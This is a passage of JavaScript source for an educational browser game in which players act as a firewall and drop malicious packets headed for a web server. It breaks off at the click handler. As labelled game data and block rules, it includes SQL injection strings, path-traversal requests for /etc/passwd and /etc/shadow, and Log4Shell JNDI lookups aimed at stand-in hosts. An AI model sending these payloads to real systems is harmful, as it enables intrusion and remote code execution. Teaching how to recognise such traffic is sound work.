/* Firewall mini-game: packets flow from the Internet to srv-web-01; DROP the ones that break the policy.
   Mounts into #fwGame, no-op when absent. DOM chips (real buttons) moved via rAF + transforms. */
(function () {
  'use strict';

  var root = document.getElementById('fwGame');
  if (!root) return;

  /* ---------- Tuning ---------- */
  var ROUND_SECONDS = 60;
  var START_LIVES = 3;
  var POINTS_DROP = 10;
  var PENALTY_FALSE_POSITIVE = 15;
  var WAVE_STARTS = [0, 20, 40];
  var MALICIOUS_RATIO = [0.45, 0.5, 0.55];
  var NEW_KIND_WEIGHT = 2.5;
  var TRAVEL_START = 7.2;
  var TRAVEL_END = 3.9;
  var SPAWN_GAP_START = 1.3;
  var SPAWN_GAP_END = 0.55;
  var SPAWN_JITTER = 0.25;
  var SPAWN_RETRY = 0.12;
  var FIRST_SPAWN_DELAY = 0.6;
  var REDUCED_TRAVEL_FACTOR = 1.35;
  var REDUCED_GAP_FACTOR = 1.2;
  var MAX_FRAME_DT = 0.05;
  var LANE_SPACING_PX = 18;
  var FIELD_PAD_PX = 10;
  var CHIP_W_WIDE = 200;
  var CHIP_H_GUESS = 46;
  var NARROW_WIDTH = 620;
  var TINY_WIDTH = 420;
  var LANES_WIDE = 4;
  var LANES_NARROW = 3;
  var LANES_TINY = 2;
  var VISIBLE_RATIO = 0.35;
  var DROP_ANIM_MS = 360;
  var POP_MS = 900;
  var HIT_MS = 520;
  var BANNER_MS = 1900;
  var MAX_MISTAKE_ROWS = 3;
  var OVERLAY_PAD_PX = 18;
  var STORAGE_KEY = 'fwGame.best';
  var RANKS = [
    { min: 0, fr: 'Stagiaire SOC', en: 'SOC Intern' },
    { min: 70, fr: 'Analyste N1', en: 'Tier-1 Analyst' },
    { min: 150, fr: 'Ingénieur sécurité', en: 'Security Engineer' },
    { min: 230, fr: 'RSSI', en: 'CISO' }
  ];

  var LANG = (document.documentElement.lang || 'fr').toLowerCase().indexOf('en') === 0 ? 'en' : 'fr';
  var STR = {
    fr: {
      title: 'Pare-feu', sub: 'iptables · srv-web-01', score: 'Score', lives: 'Vies', time: 'Temps', wave: 'Vague',
      pause: 'Pause', resume: 'Reprendre', rulesTitle: 'Politique active', internet: 'Internet',
      fieldLabel: 'Flux de paquets. Tab pour parcourir, Entrée pour bloquer, D bloque le premier paquet, P met en pause.',
      keys: 'Clavier : Tab + Entrée pour bloquer · D bloque le paquet le plus proche · P pause',
      kicker: 'Mini-jeu · 60 s', startTitle: 'Tiens le pare-feu',
      rule1: 'Des paquets arrivent d’Internet vers srv-web-01.',
      rule2: 'Clique (ou Entrée) sur ceux qui violent la politique pour les DROP.',
      rule3: 'Laisse passer le trafic légitime. 3 intrusions et le serveur tombe.',
      start: 'Démarrer', replay: 'Rejouer', best: 'Record', newBest: 'Nouveau record',
      pausedTitle: 'Trafic gelé', pausedText: 'Partie en pause. Reprends quand tu veux.',
      autoPaused: 'Pause auto : onglet masqué ou jeu hors écran.',
      overTime: 'Fin du shift : 60 s tenues', overBreach: 'Serveur compromis',
      accuracy: 'Précision', rank: 'Rang', blocked: 'bloqués', nextRank: 'Encore {n} pts pour {r}.', topRank: 'Rang maximal. Le COMEX dort tranquille.',
      intrusions: 'Intrusions', fps: 'Faux positifs',
      intrusionWhy: 'Un paquet interdit a atteint srv-web-01 : chaque intrusion coûte une vie.',
      fpWhy: 'Tu as coupé du trafic légitime : un client, un admin ou le DNS ne passe plus (−15).',
      clean: 'Zéro erreur. Le SOC t’offre le café.',
      fpPop: 'faux positif : tu as coupé un client', intrusionPop: 'intrusion',
      waveNames: ['Filtrage par port', 'Source IP et VPN', 'Charges utiles'],
      started: 'Partie lancée. Vague 1 : filtrage par port.', aDrop: 'Bloqué, +10. Score {s}.',
      aFp: 'Faux positif, −15. Score {s}.', aIntrusion: 'Intrusion ! {l} vie(s) restante(s).',
      aWave: 'Vague {w} : {n}.', aOver: 'Partie terminée. Score {s}, précision {a} %, rang {r}.',
      chipAria: '{h}, {d}. Bloquer.', livesAria: '{l} vies sur {m}'
    },
    en: {
      title: 'Firewall', sub: 'iptables · srv-web-01', score: 'Score', lives: 'Lives', time: 'Time', wave: 'Wave',
      pause: 'Pause', resume: 'Resume', rulesTitle: 'Active policy', internet: 'Internet',
      fieldLabel: 'Packet flow. Tab to browse, Enter to drop, D drops the first packet, P pauses.',
      keys: 'Keyboard: Tab + Enter to drop · D drops the closest packet · P pause',
      kicker: 'Mini-game · 60 s', startTitle: 'Hold the firewall',
      rule1: 'Packets are flowing from the Internet to srv-web-01.',
      rule2: 'Click (or press Enter) on those that break the policy to DROP them.',
      rule3: 'Let legit traffic through. 3 intrusions and the server is owned.',
      start: 'Start', replay: 'Play again', best: 'Best', newBest: 'New best',
      pausedTitle: 'Traffic frozen', pausedText: 'Game paused. Resume whenever you like.',
      autoPaused: 'Auto-paused: tab hidden or game off-screen.',
      overTime: 'Shift over: you held 60 s', overBreach: 'Server compromised',
      accuracy: 'Accuracy', rank: 'Rank', blocked: 'blocked', nextRank: '{n} more pts for {r}.', topRank: 'Top rank. The board sleeps well.',
      intrusions: 'Intrusions', fps: 'False positives',
      intrusionWhy: 'A forbidden packet reached srv-web-01: every intrusion costs a life.',
      fpWhy: 'You cut legit traffic: a customer, an admin or DNS can no longer get through (−15).',
      clean: 'Zero mistakes. The SOC owes you a coffee.',
      fpPop: 'false positive: you cut a customer', intrusionPop: 'intrusion',
      waveNames: ['Port filtering', 'Source IP and VPN', 'Payloads'],
      started: 'Game started. Wave 1: port filtering.', aDrop: 'Dropped, +10. Score {s}.',
      aFp: 'False positive, −15. Score {s}.', aIntrusion: 'Intrusion! {l} life/lives left.',
      aWave: 'Wave {w}: {n}.', aOver: 'Game over. Score {s}, accuracy {a}%, rank {r}.',
      chipAria: '{h}, {d}. Drop.', livesAria: '{l} lives out of {m}'
    }
  }[LANG];

  /* ---------- Traffic catalogue (documentation IP ranges + a few realistic ones) ---------- */
  function rnd(n) { return Math.floor(Math.random() * n); }
  function pick(list) { return list[rnd(list.length)]; }
  function octet() { return 2 + rnd(250); }
  function pubIp() {
    return pick([
      function () { return '203.0.113.' + octet(); }, function () { return '198.51.100.' + octet(); },
      function () { return '192.0.2.' + octet(); }, function () { return '45.33.' + octet() + '.' + octet(); },
      function () { return '185.220.' + octet() + '.' + octet(); }
    ])();
  }
  function vpnIp() { return '10.8.0.' + octet() + ' · VPN'; }
  function fixed(list) { return function () { return pick(list); }; }

  var KINDS = [
    { id: 'https', wave: 1, bad: false, head: 'TCP 443 · HTTPS', detail: pubIp,
      why: { fr: 'HTTPS vers le web : autorisé par la règle 80/443.', en: 'HTTPS to the web server: allowed by the 80/443 rule.' } },
    { id: 'http', wave: 1, bad: false, head: 'TCP 80 · HTTP', detail: pubIp,
      why: { fr: 'HTTP vers le web : un visiteur normal.', en: 'HTTP to the web server: a regular visitor.' } },
    { id: 'dns', wave: 1, bad: false, head: 'UDP 53 · DNS', detail: fixed(['9.9.9.9', '1.1.1.1', '208.67.222.222']),
      why: { fr: 'Réponse du résolveur DNS : UDP 53 est autorisé.', en: 'DNS resolver reply: UDP 53 is allowed.' } },
    { id: 'telnet', wave: 1, bad: true, head: 'TCP 23 · telnet', detail: pubIp,
      why: { fr: 'Telnet circule en clair : DROP depuis Internet.', en: 'Telnet is cleartext: DROP from the Internet.' } },
    { id: 'smb', wave: 1, bad: true, head: 'TCP 445 · SMB', detail: pubIp,
      why: { fr: 'SMB exposé = autoroute à rançongiciels (WannaCry).', en: 'Exposed SMB = ransomware highway (WannaCry).' } },
    { id: 'rdp', wave: 1, bad: true, head: 'TCP 3389 · RDP', detail: pubIp,
      why: { fr: 'RDP exposé = cible n°1 du brute-force.', en: 'Exposed RDP = brute-force target #1.' } },
    { id: 'sshVpn', wave: 2, bad: false, head: 'TCP 22 · SSH', detail: vpnIp,
      why: { fr: 'SSH depuis 10.8.0.0/24 : un admin via le VPN, autorisé.', en: 'SSH from 10.8.0.0/24: an admin over the VPN, allowed.' } },
    { id: 'sshExt', wave: 2, bad: true, head: 'TCP 22 · SSH', detail: pubIp,
      why: { fr: 'SSH hors VPN : seule 10.8.0.0/24 est autorisée.', en: 'SSH outside the VPN: only 10.8.0.0/24 is allowed.' } },
    { id: 'icmp', wave: 2, bad: true, head: 'ICMP · flood 2k pps', detail: pubIp,
      why: { fr: 'Flood ICMP : déni de service, DROP.', en: 'ICMP flood: denial of service, DROP.' } },
    { id: 'webOk', wave: 3, bad: false, head: 'TCP 443 · HTTPS',
      detail: fixed(['GET /api/cart?id=42', 'POST /login', 'GET /blog/zero-trust', 'GET /img/logo.svg', 'GET /search?q=firewall']),
      why: { fr: 'Requête web normale : charge utile saine.', en: 'Normal web request: clean payload.' } },
    { id: 'sqli', wave: 3, bad: true, head: 'TCP 80 · HTTP',
      detail: fixed(["GET /item?id=1' OR 1=1", "GET /wp-login?u=' OR 1=1--", "POST /search q=';DROP TABLE"]),
      why: { fr: 'Injection SQL (\' OR 1=1) dans la requête.', en: 'SQL injection (\' OR 1=1) in the request.' } },
    { id: 'traversal', wave: 3, bad: true, head: 'TCP 443 · HTTPS', detail: fixed(['GET /../../etc/passwd', 'GET /img/..%2f..%2fetc/shadow']),
      why: { fr: 'Path traversal (../) : lecture de fichiers système.', en: 'Path traversal (../): reading system files.' } },
    { id: 'jndi', wave: 3, bad: true, head: 'TCP 443 · HTTPS', detail: fixed(['UA: ${jndi:ldap://x.ru/a}', 'X-Api: ${jndi:rmi://evil}']),
      why: { fr: 'Log4Shell (${jndi:…}) : exécution de code à distance.', en: 'Log4Shell (${jndi:…}): remote code execution.' } }
  ];

  var RULES = [
    { act: 'ALLOW', wave: 1, fr: 'TCP 80, 443 → web', en: 'TCP 80, 443 → web' },
    { act: 'ALLOW', wave: 1, fr: 'UDP 53 → DNS', en: 'UDP 53 → DNS' },
    { act: 'DROP', wave: 1, fr: 'TCP 23, 445, 3389 depuis Internet', en: 'TCP 23, 445, 3389 from Internet' },
    { act: 'ALLOW', wave: 2, fr: 'TCP 22 si src ∈ 10.8.0.0/24 (VPN)', en: 'TCP 22 if src ∈ 10.8.0.0/24 (VPN)' },
    { act: 'DROP', wave: 2, fr: 'TCP 22 toute autre source', en: 'TCP 22 any other source' },
    { act: 'DROP', wave: 2, fr: 'ICMP flood', en: 'ICMP flood' },
    { act: 'DROP', wave: 3, fr: "payloads : ' OR 1=1 · ../ · ${jndi:", en: "payloads: ' OR 1=1 · ../ · ${jndi:" }
  ];

  /* ---------- Helpers ---------- */
  function fmt(s, vars) { return s.replace(/\{(\w+)\}/g, function (m, k) { return vars[k] !== undefined ? vars[k] : m; }); }
  function esc(s) { return String(s).replace(/[&<>"']/g, function (c) { return '&#' + c.charCodeAt(0) + ';'; }); }
  function lerp(a, b, f) { return a + (b - a) * f; }
  function loadBest() { try { return parseInt(localStorage.getItem(STORAGE_KEY), 10) || 0; } catch (e) { return 0; } }
  function saveBest(v) { try { localStorage.setItem(STORAGE_KEY, String(v)); } catch (e) { /* storage blocked: keep in memory */ } }
  var motionQuery = window.matchMedia ? window.matchMedia('(prefers-reduced-motion: reduce)') : null;
  function isReduced() { return !!(motionQuery && motionQuery.matches); }

  /* ---------- Static markup ---------- */
  function rulesMarkup() {
    return RULES.map(function (r, i) {
      return '<li class="fw-rule" data-wave="' + r.wave + '"><span class="fw-rule__n">' + (i + 1) + '</span>' +
        '<span class="fw-act fw-act--' + r.act.toLowerCase() + '">' + r.act + '</span>' +
        '<span class="fw-rule__txt">' + esc(r[LANG]) + '</span><span class="fw-rule__w">V' + r.wave + '</span></li>';
    }).join('');
  }

  function shellMarkup() {
    return '<section class="fw" aria-labelledby="fw-title">' +
      '<header class="fw__head"><div class="fw__brand"><span class="fw__dot" aria-hidden="true"></span>' +
      '<h3 id="fw-title" class="fw__title">' + STR.title + '</h3><span class="fw__sub">' + STR.sub + '</span></div>' +
      '<dl class="fw__hud">' +
      '<div class="fw__stat"><dt>' + STR.score + '</dt><dd data-hud="score">0</dd></div>' +
      '<div class="fw__stat"><dt>' + STR.lives + '</dt><dd data-hud="lives"></dd></div>' +
      '<div class="fw__stat"><dt>' + STR.time + '</dt><dd data-hud="time">' + ROUND_SECONDS + '</dd></div>' +
      '<div class="fw__stat"><dt>' + STR.wave + '</dt><dd data-hud="wave">1/3</dd></div></dl>' +
      '<button type="button" class="fw__btn fw__btn--ghost" data-action="pause" aria-pressed="false" disabled>' + STR.pause + '</button></header>' +
      '<div class="fw__timebar" aria-hidden="true"><span data-hud="bar"></span></div>' +
      '<div class="fw__body"><aside class="fw__rules"><h4 class="fw__rules-title">' + STR.rulesTitle + '</h4>' +
      '<ol class="fw__rule-list">' + rulesMarkup() + '</ol></aside>' +
      '<div class="fw__stage"><div class="fw__net" aria-hidden="true"><span>' + STR.internet + '</span></div>' +
      '<div class="fw__field" tabindex="-1" role="group" aria-label="' + esc(STR.fieldLabel) + '"></div>' +
      '<div class="fw__wall" aria-hidden="true"><span>FW</span></div>' +
      '<div class="fw__server" aria-hidden="true"><div class="fw__rack"><i></i><i></i><i></i></div>' +
      '<b>srv-web-01</b><small>nginx · 10.0.0.10</small></div>' +
      '<div class="fw__banner" aria-hidden="true"></div><div class="fw__overlay"></div></div></div>' +
      '<p class="fw__keys">' + STR.keys + '</p><p class="fw-sr" aria-live="polite" aria-atomic="true"></p></section>';
  }

  root.innerHTML = shellMarkup();
  var $ = function (sel) { return root.querySelector(sel); };
  var el = {
    panel: $('.fw'), field: $('.fw__field'), stage: $('.fw__stage'), overlay: $('.fw__overlay'), banner: $('.fw__banner'),
    server: $('.fw__server'), live: $('.fw-sr'), pause: $('[data-action="pause"]'), score: $('[data-hud="score"]'),
    lives: $('[data-hud="lives"]'), time: $('[data-hud="time"]'), wave: $('[data-hud="wave"]'), bar: $('[data-hud="bar"]')
  };

  /* ---------- State ---------- */
  function createState() {
    return {
      phase: 'idle', elapsed: 0, score: 0, lives: START_LIVES, wave: 1, packets: [], spawnIn: FIRST_SPAWN_DELAY,
      nextId: 1, lastTs: 0, rafId: 0, drops: 0, passes: 0, fp: 0, intrusions: 0, mistakes: {}
    };
  }
  var state = createState();
  var layout = { vertical: false, lanes: LANES_WIDE, fieldW: 0, fieldH: 0, chipW: CHIP_W_WIDE };
  var hudCache = {};

  function announce(msg) { el.live.textContent = msg; }

  /* ---------- Layout ---------- */
  function measureLayout() {
    var w = el.panel.clientWidth;
    layout.vertical = w < NARROW_WIDTH;
    layout.lanes = layout.vertical ? (w < TINY_WIDTH ? LANES_TINY : LANES_NARROW) : LANES_WIDE;
    el.panel.classList.toggle('fw--vertical', layout.vertical);
    layout.fieldW = el.field.clientWidth;
    layout.fieldH = el.field.clientHeight;
    layout.chipW = layout.vertical
      ? Math.floor((layout.fieldW - FIELD_PAD_PX * (layout.lanes + 1)) / layout.lanes)
      : CHIP_W_WIDE;
    el.field.style.setProperty('--fw-chip-w', layout.chipW + 'px');
    renderLanes();
    state.packets.forEach(function (p) { p.h = p.node.offsetHeight; placePacket(p); });
    fitStage();
  }

  function laneCross(lane, chipCross) {
    if (layout.vertical) return FIELD_PAD_PX + lane * (layout.chipW + FIELD_PAD_PX);
    var span = layout.fieldH - FIELD_PAD_PX * 2 - chipCross;
    return FIELD_PAD_PX + (layout.lanes > 1 ? lane * span / (layout.lanes - 1) : span / 2);
  }

  function renderLanes() {
    var old = el.field.querySelectorAll('.fw__lane');
    Array.prototype.forEach.call(old, function (n) { n.remove(); });
    for (var i = 0; i < layout.lanes; i++) {
      var line = document.createElement('span');
      line.className = 'fw__lane';
      var centre = layout.vertical ? laneCross(i, 0) + layout.chipW / 2 : laneCross(i, CHIP_H_GUESS) + CHIP_H_GUESS / 2;
      line.style.setProperty('--pos', centre + 'px');
      el.field.insertBefore(line, el.field.firstChild);
    }
  }
  function travelSpan(p) { return layout.vertical ? layout.fieldH - p.h : layout.fieldW - layout.chipW; }

  function packetXY(p) {
    var along = Math.min(p.progress, 1) * Math.max(travelSpan(p), 0);
    var lane = p.lane % layout.lanes;
    return layout.vertical ? [laneCross(lane, 0), along] : [along, laneCross(lane, p.h)];
  }

  function placePacket(p) {
    var xy = packetXY(p);
    p.node.style.transform = 'translate3d(' + xy[0].toFixed(1) + 'px,' + xy[1].toFixed(1) + 'px,0)';
  }

  /* ---------- Spawning ---------- */
  function difficulty() { return Math.min(state.elapsed / ROUND_SECONDS, 1); }

  function pickKind(wave) {
    var bad = Math.random() < MALICIOUS_RATIO[wave - 1];
    var pool = KINDS.filter(function (k) { return k.wave <= wave && k.bad === bad; });
    var weights = pool.map(function (k) { return k.wave === wave && wave > 1 ? NEW_KIND_WEIGHT : 1; });
    var total = weights.reduce(function (a, b) { return a + b; }, 0);
    var roll = Math.random() * total;
    for (var i = 0; i < pool.length; i++) {
      roll -= weights[i];
      if (roll <= 0) return pool[i];
    }
    return pool[pool.length - 1];
  }

  function pickLane() {
    var span = layout.vertical ? layout.fieldH : layout.fieldW - layout.chipW;
    var chipLen = layout.vertical ? CHIP_H_GUESS + LANE_SPACING_PX * 2 : layout.chipW + LANE_SPACING_PX;
    var clearance = span > 0 ? chipLen / span : 1;
    var free = [];
    for (var lane = 0; lane < layout.lanes; lane++) {
      var blocked = state.packets.some(function (p) { return p.lane % layout.lanes === lane && p.progress < clearance; });
      if (!blocked) free.push(lane);
    }
    return free.length ? pick(free) : -1;
  }

  function buildChip(p) {
    var b = document.createElement('button');
    b.type = 'button';
    b.className = 'fw-chip';
    b.dataset.id = String(p.id);
    b.setAttribute('aria-label', fmt(STR.chipAria, { h: p.kind.head, d: p.detail }));
    var head = document.createElement('span');
    head.className = 'fw-chip__head';
    head.textContent = p.kind.head;
    var det = document.createElement('span');
    det.className = 'fw-chip__detail';
    det.textContent = p.detail;
    b.appendChild(head);
    b.appendChild(det);
    return b;
  }

  function spawnPacket() {
    var lane = pickLane();
    if (lane < 0) { state.spawnIn = SPAWN_RETRY; return; }
    var f = difficulty();
    var kind = pickKind(state.wave);
    var travel = lerp(TRAVEL_START, TRAVEL_END, f) * (isReduced() ? REDUCED_TRAVEL_FACTOR : 1);
    var p = { id: state.nextId++, kind: kind, detail: kind.detail(), lane: lane, progress: 0, travel: travel, h: CHIP_H_GUESS };
    p.node = buildChip(p);
    el.field.appendChild(p.node);
    p.h = p.node.offsetHeight || CHIP_H_GUESS;
    placePacket(p);
    state.packets = state.packets.concat([p]);
    var jitter = 1 + (Math.random() * 2 - 1) * SPAWN_JITTER;
    state.spawnIn = lerp(SPAWN_GAP_START, SPAWN_GAP_END, f) * jitter * (isReduced() ? REDUCED_GAP_FACTOR : 1);
  }

  /* ---------- Outcomes ---------- */
  function addMistake(p, type) {
    var key = type + '|' + p.kind.id;
    var prev = state.mistakes[key] || { type: type, kind: p.kind, sample: p.detail, count: 0 };
    state.mistakes = Object.assign({}, state.mistakes, (function () {
      var o = {}; o[key] = Object.assign({}, prev, { count: prev.count + 1 }); return o;
    })());
  }

  function retire(p, cls, delay) {
    state.packets = state.packets.filter(function (q) { return q !== p; });
    var node = p.node;
    if (document.activeElement === node) moveFocusFrom(node);
    node.classList.add(cls);
    node.disabled = true;
    window.setTimeout(function () { node.remove(); }, delay);
  }

  function moveFocusFrom(node) {
    var next = node.nextElementSibling;
    while (next && (next.disabled || !next.classList.contains('fw-chip'))) next = next.nextElementSibling;
    var target = next || el.field;
    target.focus({ preventScroll: true });
  }

  function pop(p, text, tone) {
    var xy = packetXY(p);
    var n = document.createElement('span');
    n.className = 'fw-pop fw-pop--' + tone;
    n.textContent = text;
    n.style.left = Math.min(xy[0], Math.max(layout.fieldW - layout.chipW, 0)) + 'px';
    n.style.top = xy[1] + 'px';
    el.field.appendChild(n);
    window.setTimeout(function () { n.remove(); }, POP_MS);
  }

  function dropPacket(p) {
    if (state.phase !== 'running' || !p) return;
    if (p.kind.bad) {
      state.score += POINTS_DROP;
      state.drops++;
      pop(p, '+' + POINTS_DROP + ' DROP', 'ok');
      retire(p, 'is-blocked', DROP_ANIM_MS);
      announce(fmt(STR.aDrop, { s: state.score }));
    } else {
      state.score = Math.max(0, state.score - PENALTY_FALSE_POSITIVE);
      state.fp++;
      addMistake(p, 'fp');
      pop(p, '−' + PENALTY_FALSE_POSITIVE + ' ' + STR.fpPop, 'crit');
      retire(p, 'is-fp', DROP_ANIM_MS);
      announce(fmt(STR.aFp, { s: state.score }));
    }
    bump(el.score);
    updateHud();
  }

  function reachServer(p) {
    if (!p.kind.bad) {
      state.passes++;
      retire(p, 'is-served', DROP_ANIM_MS);
      flashServer('is-served');
      return;
    }
    state.lives--;
    state.intrusions++;
    addMistake(p, 'intrusion');
    pop(p, STR.intrusionPop, 'crit');
    retire(p, 'is-intrusion', DROP_ANIM_MS);
    flashServer('is-hit');
    announce(fmt(STR.aIntrusion, { l: state.lives }));
    updateHud();
    if (state.lives <= 0) endGame('breach');
  }

  function flashServer(cls) {
    el.server.classList.remove(cls);
    void el.server.offsetWidth;
    el.server.classList.add(cls);
    window.setTimeout(function () { el.server.classList.remove(cls); }, HIT_MS);
    if (cls === 'is-hit' && !isReduced()) {
      el.stage.classList.remove('is-shaking');
      void el.stage.offsetWidth;
      el.stage.classList.add('is-shaking');
    }
  }

  function bump(node) {
    if (isReduced()) return;
    node.classList.remove('is-bump');
    void node.offsetWidth;
    node.classList.add('is-bump');
  }

  /* ---------- HUD ---------- */
  function setHud(key, node, value, asHtml) {
    if (hudCache[key] === value) return;
    hudCache[key] = value;
    if (asHtml) node.innerHTML = value; else node.textContent = value;
  }

  function livesMarkup() {
    var out = '';
    for (var i = 0; i < START_LIVES; i++) out += '<i class="fw-life' + (i < state.lives ? '' : ' is-lost') + '"></i>';
    return out;
  }

  function updateHud() {
    var remaining = Math.max(0, Math.ceil(ROUND_SECONDS - state.elapsed));
    setHud('score', el.score, String(state.score));
    setHud('lives', el.lives, livesMarkup(), true);
    el.lives.setAttribute('aria-label', fmt(STR.livesAria, { l: state.lives, m: START_LIVES }));
    setHud('time', el.time, remaining + ' s');
    setHud('wave', el.wave, state.wave + '/' + WAVE_STARTS.length);
    el.bar.style.transform = 'scaleX(' + (1 - Math.min(state.elapsed / ROUND_SECONDS, 1)).toFixed(4) + ')';
    el.time.classList.toggle('is-low', remaining <= 10 && state.phase === 'running');
  }

  /* ---------- Waves ---------- */
  function currentWave() { return WAVE_STARTS.filter(function (s) { return state.elapsed >= s; }).length; }

  function showWave(wave) {
    var name = STR.waveNames[wave - 1];
    el.banner.innerHTML = '<small>' + STR.wave + ' ' + wave + '</small>' + esc(name);
    el.banner.classList.remove('is-on');
    void el.banner.offsetWidth;
    el.banner.classList.add('is-on');
    window.setTimeout(function () { el.banner.classList.remove('is-on'); }, BANNER_MS);
    Array.prototype.forEach.call(root.querySelectorAll('.fw-rule'), function (r) {
      var w = parseInt(r.dataset.wave, 10);
      r.classList.toggle('is-hot', w === wave);
      r.classList.toggle('is-armed', w <= wave);
    });
  }

  function checkWave() {
    var wave = currentWave();
    if (wave === state.wave) return;
    state.wave = wave;
    showWave(wave);
    announce(fmt(STR.aWave, { w: wave, n: STR.waveNames[wave - 1] }));
  }

  /* ---------- Loop ---------- */
  function tick(dt) {
    state.elapsed += dt;
    if (state.elapsed >= ROUND_SECONDS) { endGame('time'); return; }
    checkWave();
    state.spawnIn -= dt;
    if (state.spawnIn <= 0) spawnPacket();
    state.packets.forEach(function (p) { p.progress += dt / p.travel; });
    state.packets.filter(function (p) { return p.progress >= 1; }).forEach(function (p) {
      if (state.phase === 'running') reachServer(p);
    });
  }

  function frame(ts) {
    if (state.phase !== 'running') return;
    var dt = Math.max(0, Math.min((ts - state.lastTs) / 1000, MAX_FRAME_DT));
    state.lastTs = ts;
    tick(dt);
    if (state.phase !== 'running') return;
    state.packets.forEach(placePacket);
    updateHud();
    state.rafId = window.requestAnimationFrame(frame);
  }

  function runLoop() {
    state.lastTs = performance.now();
    window.cancelAnimationFrame(state.rafId);
    state.rafId = window.requestAnimationFrame(frame);
  }

  /* ---------- Screens ---------- */
  function showOverlay(html, focusSel, variant) {
    el.overlay.innerHTML = '<div class="fw-card' + (variant ? ' fw-card--' + variant : '') + '">' + html + '</div>';
    el.overlay.classList.add('is-on');
    fitStage();
    el.overlay.scrollTop = 0;
    var target = focusSel && el.overlay.querySelector(focusSel);
    if (target) target.focus({ preventScroll: true });
  }

  function hideOverlay() { el.overlay.classList.remove('is-on'); el.overlay.innerHTML = ''; fitStage(); }

  // Let the stage grow so a tall card (game over) never hides its buttons
  function fitStage() {
    el.stage.style.minHeight = '';
    var card = el.overlay.classList.contains('is-on') && el.overlay.firstChild;
    if (!card) return;
    var needed = card.offsetHeight + OVERLAY_PAD_PX * 2;
    if (needed > el.stage.clientHeight) el.stage.style.minHeight = needed + 'px';
  }

  function startScreen() {
    var best = loadBest();
    showOverlay('<p class="fw-card__kicker">' + STR.kicker + '</p><h4 class="fw-card__title">' + STR.startTitle + '</h4>' +
      '<ol class="fw-card__rules"><li>' + STR.rule1 + '</li><li>' + STR.rule2 + '</li><li>' + STR.rule3 + '</li></ol>' +
      '<div class="fw-card__actions"><button type="button" class="fw__btn" data-action="start">' + STR.start + ' ▸</button>' +
      (best ? '<span class="fw-card__best">' + STR.best + ' · ' + best + '</span>' : '') + '</div>');
  }

  function clearField() {
    state.packets.forEach(function (p) { p.node.remove(); });
    Array.prototype.forEach.call(el.field.querySelectorAll('.fw-chip, .fw-pop'), function (n) { n.remove(); });
  }

  function startGame() {
    clearField();
    state = createState();
    hudCache = {};
    state.phase = 'running';
    hideOverlay();
    measureLayout();
    updateHud();
    setPauseButton(false, true);
    showWave(1);
    announce(STR.started);
    el.field.focus({ preventScroll: true });
    runLoop();
  }

  function setPauseButton(paused, enabled) {
    el.pause.disabled = !enabled;
    el.pause.textContent = paused ? STR.resume : STR.pause;
    el.pause.setAttribute('aria-pressed', String(paused));
  }

  function pauseGame(isAuto) {
    if (state.phase !== 'running') return;
    state.phase = 'paused';
    window.cancelAnimationFrame(state.rafId);
    setPauseButton(true, true);
    showOverlay('<p class="fw-card__kicker">' + STR.pause + '</p><h4 class="fw-card__title">' + STR.pausedTitle + '</h4>' +
      '<p class="fw-card__text">' + (isAuto ? STR.autoPaused : STR.pausedText) + '</p>' +
      '<div class="fw-card__actions"><button type="button" class="fw__btn" data-action="resume">' + STR.resume + ' ▸</button></div>',
      isAuto ? null : '[data-action="resume"]');
  }

  function resumeGame() {
    if (state.phase !== 'paused') return;
    state.phase = 'running';
    hideOverlay();
    setPauseButton(false, true);
    el.field.focus({ preventScroll: true });
    runLoop();
  }

  /* ---------- Game over ---------- */
  function rankFor(score) {
    var idx = 0;
    RANKS.forEach(function (r, i) { if (score >= r.min) idx = i; });
    return { current: RANKS[idx], next: RANKS[idx + 1] || null };
  }

  function accuracy() {
    var good = state.drops + state.passes;
    var total = good + state.fp + state.intrusions;
    return total ? Math.round(good / total * 100) : 0;
  }

  function mistakeGroup(type, title, why) {
    var rows = Object.keys(state.mistakes).map(function (k) { return state.mistakes[k]; })
      .filter(function (m) { return m.type === type; })
      .sort(function (a, b) { return b.count - a.count; });
    if (!rows.length) return '';
    var total = rows.reduce(function (a, m) { return a + m.count; }, 0);
    var items = rows.slice(0, MAX_MISTAKE_ROWS).map(function (m) {
      return '<li><code>' + esc(m.kind.head) + ' · ' + esc(m.sample) + '</code><span>×' + m.count + ' · ' + esc(m.kind.why[LANG]) + '</span></li>';
    }).join('');
    return '<div class="fw-err fw-err--' + type + '"><p class="fw-err__title">' + title + ' <b>' + total + '</b></p>' +
      '<p class="fw-err__why">' + why + '</p><ul>' + items + '</ul></div>';
  }

  function overMarkup(reason, acc, rank, best, isRecord) {
    var hint = rank.next ? fmt(STR.nextRank, { n: rank.next.min - state.score, r: rank.next[LANG] }) : STR.topRank;
    var errors = mistakeGroup('intrusion', STR.intrusions, STR.intrusionWhy) + mistakeGroup('fp', STR.fps, STR.fpWhy);
    return '<p class="fw-card__kicker fw-card__kicker--' + reason + '">' + (reason === 'time' ? STR.overTime : STR.overBreach) + '</p>' +
      '<div class="fw-result"><div><span class="fw-result__big">' + state.score + '</span><small>' + STR.score + '</small></div>' +
      '<div><span class="fw-result__big">' + acc + '<em>%</em></span><small>' + STR.accuracy + '</small></div>' +
      '<div><span class="fw-result__big">' + state.drops + '</span><small>' + STR.blocked + '</small></div></div>' +
      '<p class="fw-rank"><span>' + STR.rank + '</span><b>' + rank.current[LANG] + '</b>' +
      (isRecord ? '<em class="fw-rank__rec">' + STR.newBest + '</em>' : '<em>' + STR.best + ' · ' + best + '</em>') + '</p>' +
      '<p class="fw-card__text">' + hint + '</p>' + (errors ? '<div class="fw-errs">' + errors + '</div>' : '<p class="fw-err__clean">' + STR.clean + '</p>') +
      '<div class="fw-card__actions"><button type="button" class="fw__btn" data-action="start">' + STR.replay + ' ↻</button></div>';
  }

  function endGame(reason) {
    if (state.phase === 'over') return;
    state.phase = 'over';
    window.cancelAnimationFrame(state.rafId);
    state.packets.forEach(function (p) { retire(p, 'is-frozen', DROP_ANIM_MS); });
    var prevBest = loadBest();
    var isRecord = state.score > prevBest;
    if (isRecord) saveBest(state.score);
    var best = Math.max(prevBest, state.score);
    var acc = accuracy();
    var rank = rankFor(state.score);
    updateHud();
    setPauseButton(false, false);
    showOverlay(overMarkup(reason, acc, rank, best, isRecord), '[data-action="start"]', 'over');
    announce(fmt(STR.aOver, { s: state.score, a: acc, r: rank.current[LANG] }));
  }

  /* ---------- Input ---------- */
  function packetFromNode(node) {
    var id = parseInt(node.dataset.id, 10);
    return state.packets.filter(function (p) { return p.id === id; })[0];
  }

  function frontPacket() {
    return state.packets.reduce(function (best, p) { return !best || p.progress > best.progress ? p : best; }, null);
  }

  function onClick(e) {
